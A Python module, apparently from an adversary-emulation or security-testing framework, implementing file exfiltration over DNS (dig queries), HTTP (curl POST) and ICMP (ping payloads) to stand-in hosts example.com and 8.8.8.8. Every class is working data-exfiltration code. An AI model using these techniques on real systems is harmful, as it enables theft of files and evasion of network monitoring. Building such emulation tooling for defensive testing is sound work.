from .SendFileBase import SendFileBase

class SendFileUDP(SendFileBase):
    """
    Send a file to a remote location via DNS (UDP) exfiltration.
    
    This action sends files using DNS exfiltration (using dig) over UDP.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileUDP", "udp")


    def _send_file(self, live_session, file_path: str) -> tuple[str, int]:
        """
        Send file via DNS exfiltration using base64 encoding and dig.
        """
        # Encode file to base64
        encoded_data, encode_status = self._encode_file(live_session, file_path)
        if encode_status != 0:
            return "Failed to read and encode file", 1
        
        # Split into chunks (DNS labels max 63 chars, use 50 for safety)
        chunk_size = 50
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        # Send chunks via DNS queries to a default DNS server
        # Using a simple domain for testing
        target_domain = "example.com"
        dns_server = "8.8.8.8"
        
        results = []
        for i, chunk in enumerate(chunks):
            # Clean chunk for DNS (remove invalid chars)
            clean_chunk = ''.join(c for c in chunk if c.isalnum() or c in ['+', '/', '='])
            dns_cmd = f"dig @{dns_server} {clean_chunk}.{i}.{target_domain} +short 2>&1"
            result = live_session.run_command(dns_cmd)
            results.append(result)
            # Limit output to first 10 chunks for testing
            if i >= 9:
                break
        
        output = f"Sent {min(len(chunks), 10)} DNS chunks via UDP to {dns_server}\n" + "\n".join(results[:5])
        exit_status = 0
        return output, exit_status



class SendFileHTTP(SendFileBase):
    """
    Send a file to a remote location via HTTP POST.
    
    This action sends files using HTTP POST (using curl) over TCP.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileHTTP", "http")

    def _send_file(self, live_session, file_path: str) -> tuple[str, int]:
        """
        Send file via HTTP POST using curl.
        """
        escaped_path = file_path.replace('"', '\\"')
        target_url = "http://example.com/upload"
        cmd = f"curl -X POST -F 'file=@{escaped_path}' {target_url} 2>&1"
        output = live_session.run_command(cmd)
        exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK"]) else 1
        return output, exit_status


class SendFileICMP(SendFileBase):
    """
    Send a file to a remote location via ICMP exfiltration.
    
    This action sends files using ICMP ping packets with data payload.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileICMP", "icmp")

    def _send_file(self, live_session, file_path: str) -> tuple[str, int]:
        """
        Send file via ICMP exfiltration using ping with data payload.
        """
        encoded_data, encode_status = self._encode_file(live_session, file_path)
        if encode_status != 0:
            return "Failed to read and encode file", 1
        
        chunk_size = 32
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        target_ip = "8.8.8.8"
        
        results = []
        for i, chunk in enumerate(chunks[:10]):  # Limit to 10 for testing
            hex_data = chunk[:8].encode().hex()
            ping_cmd = f"ping -c 1 -p {hex_data} {target_ip} 2>&1"
            result = live_session.run_command(ping_cmd)
            results.append(result)
        
        output = f"Sent {min(len(chunks), 10)} ICMP packets to {target_ip}\n" + "\n".join(results[:3])
        exit_status = 0
        return output, exit_status

